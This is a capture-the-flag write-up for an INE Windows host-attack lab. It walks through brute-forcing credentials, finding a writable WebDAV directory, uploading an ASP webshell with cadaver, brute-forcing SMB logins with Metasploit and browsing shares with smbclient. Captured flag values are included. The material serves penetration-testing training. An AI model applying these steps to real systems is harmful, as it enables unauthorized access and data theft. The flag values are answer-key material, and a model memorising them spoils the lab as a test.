
System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.

This lab is designed to test your knowledge and skills in performing system/host-based attacks on Windows targets and identifying hidden information on a target machine.


### Completing Skill Check Labs

Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.

**Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.

**Useful files:**

```
/usr/share/metasploit-framework/data/wordlists/common_users.txt, 
/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt,
/usr/share/webshells/asp/webshell.asp
```

**Flags to Capture:**

- **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)
- **Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)
- **Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)
- **Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

# Tools

The best tools for this lab are:

- Nmap
- Hydra
- Cadaver
- Metasploit Framework


**CHECK OUT :
https://shagzz.medium.com/host-network-penetration-testing-system-host-based-attacks-ctf-1-4affa0838800

__________

 **Flag 1**: User 'bob' might not have chosen a strong password. Try common passwords to gain access to the server where the flag is located. (target1.ine.local)

first thing that got in my mind is **BRUTE FORCE

use HYDRA or Metasploit

___________________________________

**Flag 2**: Valuable files are often on the C: drive. Explore it thoroughly. (target1.ine.local)

```
└─# dirb http://target1.ine.local -u bob:password_123321                                                                                                                                   

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 26 00:50:21 2025
URL_BASE: http://target1.ine.local/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
AUTHORIZATION: bob:password_123321

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://target1.ine.local/ ----
==> DIRECTORY: http://target1.ine.local/aspnet_client/                                                                                                                                    
==> DIRECTORY: http://target1.ine.local/webdav/  
```

Now we know there is a /webdav/

use DAVtest tool

```
davtest -auth bob:password_123321 -url http://target1.ine.local
```

```
davtest -auth bob:password_123321 -url http://target1.ine.local                                                                                                                                                                       
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://target1.ine.local
********************************************************
NOTE    Random string for this session: aj6yQpfZ
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://target1.ine.local/DavTestDir_aj6yQpfZ
********************************************************
 Sending test files
PUT     aspx    SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.aspx
PUT     jsp     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.jsp
PUT     txt     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.txt
PUT     cgi     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.cgi
PUT     jhtml   SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.jhtml
PUT     html    SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.html
PUT     php     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.php
PUT     cfm     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.cfm
PUT     shtml   SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.shtml
PUT     pl      SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.pl
PUT     asp     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.asp
********************************************************
 Checking for test file execution
EXEC    aspx    SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.aspx
EXEC    aspx    FAIL
EXEC    jsp     FAIL
EXEC    txt     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.txt
EXEC    txt     FAIL
EXEC    cgi     FAIL
EXEC    jhtml   FAIL
EXEC    html    SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.html
EXEC    html    FAIL
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    shtml   SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.shtml
EXEC    shtml   FAIL
EXEC    pl      FAIL
EXEC    asp     SUCCEED:        http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.asp
EXEC    asp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://target1.ine.local/DavTestDir_aj6yQpfZ
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.aspx
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.jsp
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.txt
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.cgi
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.jhtml
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.html
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.php
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.cfm
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.shtml
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.pl
PUT File: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.asp
Executes: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.aspx
Executes: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.txt
Executes: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.html
Executes: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.shtml
Executes: http://target1.ine.local/DavTestDir_aj6yQpfZ/davtest_aj6yQpfZ.asp


```

WE can exec .asp files

CADAVER TOOLs

```
cadaver http://target1.ine.local
```

```
└─# cadaver http://target1.ine.local
Authentication required for target1.ine.local on server `target1.ine.local':
Username: bob
Password: 
dav:/> put /usr/share/webshells/asp
asp/  aspx/ 
dav:/> put /usr/share/webshells/asp/webshell.asp 
Uploading /usr/share/webshells/asp/webshell.asp to `/webshell.asp':
Progress: [=============================>] 100.0% of 1362 bytes succeeded.
dav:/> 

```

now go to 

http://target1.ine.local/webdav/webshell.asp

we got WEBSHELL

```
type C:\flag2.txt
```

____________________________

**Flag 3**: By attempting to guess SMB user credentials, you may uncover important information that could lead you to the next flag. (target2.ine.local)

same try **BRUTE FORCE

is used **metasploit

use **smb_login** modules

set RHOISTS target2.ine.local

set USER_FILE /usr/share/metasploit-framwork/data/wordlists/common_users.txt

set PASS_FILE /usr/share/metasploit-framwork/data/wordlists/unix_password.txt

set CreateSession True

AFTER FEW MINS

I GOT ADMINISTRATOR

administrator: pineapple

so 

use **SMBCLIENT**

smbclient -L //target2.ine.lcoal -U administrator
password : pineapple

```
└─# smbclient -L //target2.ine.local -U administrator
Password for [WORKGROUP\administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Shared          Disk      
        Shared2         Disk      
        Shared3         Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to target2.ine.local failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```

```
└─# smbclient  //target2.ine.local/C$ -U administrator
Password for [WORKGROUP\administrator]:
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Sat Nov  7 13:45:59 2020
  Boot                              DHS        0  Wed Sep  9 10:08:52 2020
  bootmgr                          AHSR   408692  Wed Sep  9 10:03:42 2020
  BOOTNXT                           AHS        1  Sat Sep 15 12:42:30 2018
  Documents and Settings          DHSrn        0  Wed Nov 14 21:40:15 2018
  EFI                                 D        0  Wed Nov 14 12:26:18 2018
  flag3.txt                           A       34  Fri Sep 26 00:43:15 2025
  pagefile.sys                      AHS 2013265920  Fri Sep 26 00:41:09 2025
  PerfLogs                            D        0  Wed May 13 23:28:09 2020
  Program Files                      DR        0  Sat Nov  7 13:17:23 2020
  Program Files (x86)                 D        0  Sat Nov  7 13:17:24 2020
  ProgramData                       DHn        0  Wed Jan  1 13:47:15 2025
  Recovery                         DHSn        0  Wed Jan  1 13:54:07 2025
  Shared                              D        0  Tue Dec 31 16:59:14 2024
  System Volume Information         DHS        0  Sat Nov  7 12:06:43 2020
  Users                              DR        0  Wed Jan  1 14:00:24 2025
  Utilities                           D        0  Sat Nov  7 13:19:05 2020
  Windows                             D        0  Fri Sep 26 00:46:11 2025

                7863807 blocks of size 4096. 3647703 blocks available                                                                                                                      
smb: \> get flag3.txt
getting file \flag3.txt of size 34 as flag3.txt (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
smb: \> exit

┌──(root㉿INE)-[~]
└─# cat flag3.txt                                                                                                                                                                          
ed55c2e163be418f8fa3c4846a3c41f0

```

we got flag3

____________

**Flag 4**: The Desktop directory might have what you're looking for. Enumerate its contents. (target2.ine.local)

so we have SMB CREDENTIALS "administrator"

cd to DESKTOP

```
                7863807 blocks of size 4096. 3647703 blocks available
smb: \> cd Users
smb: \Users\> cd Administrator\
smb: \Users\Administrator\> cd Desktop\
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Fri Sep 26 00:43:15 2025
  ..                                 DR        0  Fri Sep 26 00:43:15 2025
  desktop.ini                       AHS      282  Wed Jan  1 14:00:35 2025
  flag4.txt                           A       34  Fri Sep 26 00:43:15 2025

                7863807 blocks of size 4096. 3647703 blocks available
smb: \Users\Administrator\Desktop\> get flag4.txt 
getting file \Users\Administrator\Desktop\flag4.txt of size 34 as flag4.txt (3.7 KiloBytes/sec) (average 3.7 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit

┌──(root㉿INE)-[~]
└─# cat flag4.txt                                                                                                                                                                          
8f3e0417c15a4847a1c36c6c908ff10c

```

we got flag4

